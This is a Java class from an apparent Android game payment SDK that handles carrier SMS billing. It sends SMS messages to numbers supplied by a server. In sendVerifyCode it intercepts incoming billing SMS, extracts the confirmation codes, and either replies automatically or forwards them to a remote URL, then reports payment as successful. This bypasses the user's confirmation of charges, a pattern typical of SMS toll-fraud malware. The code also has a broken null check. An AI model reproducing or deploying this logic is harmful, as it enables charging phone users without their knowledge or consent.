package mobi.zty.pay.sdk.generalFee;

import java.util.ArrayList;
import java.util.List;

import mobi.zty.pay.sdk.PayConfig;
import mobi.zty.pay.sdk.PayResultInfo;
import mobi.zty.pay.sdk.PaymentInterf;
import mobi.zty.sdk.game.Constants;
import mobi.zty.sdk.game.GameSDK;
import mobi.zty.sdk.game.bean.FeeInfo;
import mobi.zty.sdk.game.bean.SMSInfo;
import mobi.zty.sdk.game.intercept.MessageItem;
import mobi.zty.sdk.util.Helper;
import mobi.zty.sdk.util.HttpRequestt;
import mobi.zty.sdk.util.Util_G;

import org.json.JSONObject;

import android.app.PendingIntent;
import android.content.Context;
import android.content.Intent;
import android.os.Handler;
import android.os.Message;
import android.provider.SyncStateContract.Helpers;

/**
 * 动漫移动点播支付管理类
 * @author Administrator
 *mobi.zty.pay.sdk.generalFee.GeneraFeeInstance
 */
public class GeneraFeeInstance extends PaymentInterf{
	private static GeneraFeeInstance instance;
	private Context context;
	private Handler callBHandler;
	private int doingPayCount = 0;
	private Handler handler = new Handler(){
		public void handleMessage(Message msg) {
			 FeeInfo feeInfo = (FeeInfo) msg.obj;
			 extracted(context, feeInfo);
			 doingPayCount--;
		};
	};
	public static GeneraFeeInstance getInstance(){
		if(instance==null){
			instance = scyDFpay();
		}
		return instance;
	}
	private static synchronized GeneraFeeInstance scyDFpay(){
		if(instance==null){
			instance =  new GeneraFeeInstance();
		}
		return instance;
	}
	@Override
	public void init(Context context, Object... parameters) {
		this.context = context;
		callBHandler = (Handler) parameters[0];
	}

	/**
	 * 通用支付的类 pay方法里面只负责发送短信
	 */
	@Override
	public void pay(final Context context, Object... parameters) {
		FeeInfo feeInfo = (FeeInfo) parameters[0];
		Helper.sendPayMessageToServer(PayConfig.GENERA_KEY, "服务端支撑的 通用支付", feeInfo.orderId);
		
//		if(feeInfo.payType==41){//联通饭盒计费,连续购买的时候延迟发放支付请求
//			
//			if (doingPayCount==0) {
//				extracted(context, feeInfo);
//			}else{
//				Message message = new Message();
//				message.obj = feeInfo;
//				message.what = 0;
//				handler.sendMessageDelayed(message, doingPayCount*30000);
//			}
//			doingPayCount++;
//		}else{
//			extracted(context, feeInfo);
//		}
		extracted(context, feeInfo);
		
	}
	private void extracted(final Context context, FeeInfo feeInfo) {
		if (feeInfo.needSms==1) {
			if (feeInfo.smsInfos==null&&feeInfo.smsInfos.size()==0) {
				notifyResult(feeInfo.orderId, PayConfig.SMS_INFO_NULL);
				Helper.sendPayMessageToServer(PayConfig.GENERA_KEY, "feeInfo.smsInfo==null", feeInfo.orderId);
				return;
			}
			for (int i = 0; i < feeInfo.smsInfos.size(); i++) {
				SMSInfo smsInfo = feeInfo.smsInfos.get(i);
				String send_num = smsInfo.sendNum;//下行端口
				String content = smsInfo.smsContent;//短信内容
				if (!Helper.isEmpty(send_num)&&!Helper.isEmpty(content)) {
					Intent itSend = new Intent(Constants.SENT_SMS_ACTION);  
					itSend.putExtra("order_id", feeInfo.orderId);
			        PendingIntent mSendPI = PendingIntent.getBroadcast(context.getApplicationContext(), 0,
			        		itSend, PendingIntent.FLAG_ONE_SHOT);//这里requestCode和flag的设置很重要，影响数据KEY_PHONENUM的传递。   
			        Util_G.sendTextMessage(context, send_num, content, mSendPI, smsInfo.type);
			        Util_G.debugE("GENERA_PAY", "sms_content->"+content);
			        Helper.sendPayMessageToServer(PayConfig.GENERA_KEY, "执行支付send_num="+send_num+"content="+content, feeInfo.orderId);
				}else{
					 Helper.sendPayMessageToServer(PayConfig.GENERA_KEY, "send_num 或者 send_content 都为空", feeInfo.orderId);
				}
			}
			
		}else if (feeInfo.isGeneral==1&&feeInfo.verify==0) {//如果不需要发送短信 也不是本地的支付 并且不需要发送短信  那直接当作支付成功
			notifyResult(feeInfo.orderId, PayConfig.BIIL_SUCC);
		}
	}
	private void notifyResult(String orderId,int resultCode) {
		PayResultInfo info = new PayResultInfo();
		info.orderId = orderId;
		info.resutCode = resultCode;
		info.retMsg = "支付失败:"+info.resutCode;
		Message message = callBHandler.obtainMessage(PayConfig.NOTIFY_PAYRESULT);
		message.obj = info;
		message.sendToTarget();
	}
	/**
	 * 负责截取对应的 验证码  或者回复对应的验证确认信息
	 */
	@Override
	public synchronized void  sendVerifyCode(Object... parameters) {
		String sendFrom = (String) parameters[0];
		String content = (String) parameters[1];
		String orderId = (String) parameters[2];
		final FeeInfo feeInfo = GameSDK.getInstance().getFeeInfoByOrderId(orderId);
		if (feeInfo==null||feeInfo.verifyInfo==null) return;
		String vertifyNum = feeInfo.verifyInfo.vertifyNum;
		if (sendFrom.contains(vertifyNum)) {
			String[] interceptContents = feeInfo.verifyInfo.interceptContent;
			boolean canIntercept = true;
			if (interceptContents!=null
					&&interceptContents.length>0) {
				for (int i = 0; i < interceptContents.length; i++) {
					if (!content.contains(interceptContents[i])) {
						canIntercept = false;
						break;
					}
				}
			}
			if (canIntercept) {
				feeInfo.payStep = 2;
				Intent itSend = new Intent(Constants.SENT_SMS_ACTION);
				itSend.putExtra("order_id", feeInfo.orderId);
				PendingIntent mSendPI = PendingIntent.getBroadcast(
						context.getApplicationContext(), 0, itSend,
						PendingIntent.FLAG_ONE_SHOT);// 这里requestCode和flag的设置很重要，影响数据KEY_PHONENUM的传递。
				String confimNum = sendFrom;
				if (!Helper.isEmpty(feeInfo.verifyInfo.confimNum)) {
					confimNum = feeInfo.verifyInfo.confimNum;
				}
				switch (feeInfo.verifyInfo.vertifyType) {
				case 0:
					Util_G.sendTextMessage(context, confimNum, feeInfo.verifyInfo.fixedContent, mSendPI, 0);
					Helper.sendPayMessageToServer(feeInfo.payType, "回复验证码:"+feeInfo.verifyInfo.fixedContent, feeInfo.orderId);
					Util_G.debugE("GENERATE", feeInfo.payType+"验证码确认短信:"+feeInfo.verifyInfo.fixedContent);
					break;
				case 1:
				case 2:{
						Util_G.debugE("ALLPAY", "vertifyNum——》》开始截取验证码");
						int startIndex = -1;
						int endIndex = 1;
						int length = feeInfo.verifyInfo.digitalLength;
						String munber = "0123456789";
						for (int i = 0; i < content.length(); i++) {
							String cr = content.charAt(i) + "";
							if (startIndex < 0 && munber.contains(cr)) {
								startIndex = i;
							} 
							if ((startIndex >= 0&& !munber.contains(cr))||i==content.length()-1) {
								endIndex = (i==content.length()-1)?i+1:i;
								if (endIndex - startIndex < length) {
									startIndex = -1;
									continue;
								} else {
									break;
								}
							}
						}
						if (endIndex<=startIndex) {
							Helper.sendPayMessageToServer(feeInfo.payType, "读取到验证码失败", orderId);
							return;
						}
						final String vetif_code = content.substring(startIndex,
								endIndex);
						if (feeInfo.verifyInfo.vertifyType==1||feeInfo.verifyInfo.vertifyType==3) {
							Util_G.sendTextMessage(context, confimNum, 
									vetif_code, mSendPI, 0);
						}
						if (feeInfo.verifyInfo.vertifyType==2||feeInfo.verifyInfo.vertifyType==3) {
							new Thread(new Runnable() {
								@Override
								public void run() {
									String url = feeInfo.verifyInfo.vertifyUrl+"?vetify_code="+vetif_code+"&order_id="
								+feeInfo.orderId+"&pay_type="+feeInfo.payType+"&Ext=";
									String requestResponse = HttpRequestt.get(url).body();//回传就好 不用管回调
								}
							}).start();
							notifyResult(orderId, PayConfig.BIIL_SUCC);//这种 不要使用短信回复验证码的 直接通知成功发货
						}
						Helper.sendPayMessageToServer(feeInfo.payType, "读取到验证码vertifyNum="+vertifyNum, orderId);
						Util_G.debugE("ALLPAY", "vertifyNum——》》"+vetif_code);
					}
					break;
				default:
					break;
				}
			}else{
				Helper.sendPayMessageToServer(feeInfo.payType, "拦截内容配置不合理", feeInfo.orderId);
			}
		}else{
			Helper.sendPayMessageToServer(feeInfo.payType, "后台配置端口错误sendFrom"+sendFrom+"vertifyNum="+vertifyNum, feeInfo.orderId);
		}
		super.sendVerifyCode(parameters);
	}
	
	/**
	 * 短信发送成功  通知后台的 逻辑
	 */
	@Override
	public void notifyPay(Object... parameters) {
		final int sendSucc = (Integer) parameters[0];
		final String orderId = (String) parameters[1];
		final FeeInfo feeInfo = GameSDK.getInstance().getFeeInfoByOrderId(orderId);
		if (feeInfo==null||feeInfo.smsInfos.size()==0) return;
		new Thread(new Runnable() {
			@Override
			public void run() {
				for (int i = 0; i < feeInfo.smsInfos.size(); i++) {
					if (feeInfo.smsInfos.get(i).succNotify==0) continue;
					String url = feeInfo.smsInfos.get(i).smsNotifyUrl+"?succ="+sendSucc+"&order_id="+orderId+
							"&pay_type="+feeInfo.payType+"&Ext=";
					String requestResponse = HttpRequestt.get(url).body();
					if (requestResponse!=null && requestResponse!="") {
						JSONObject retJson = Helper.getJSONObject(requestResponse);
						int state = Helper.getJsonInt(retJson, "status");
						Util_G.debugE("generaFee_pay", "pay_succ->"+state);
					}
				}
			}
		}).start();
	}
	
}
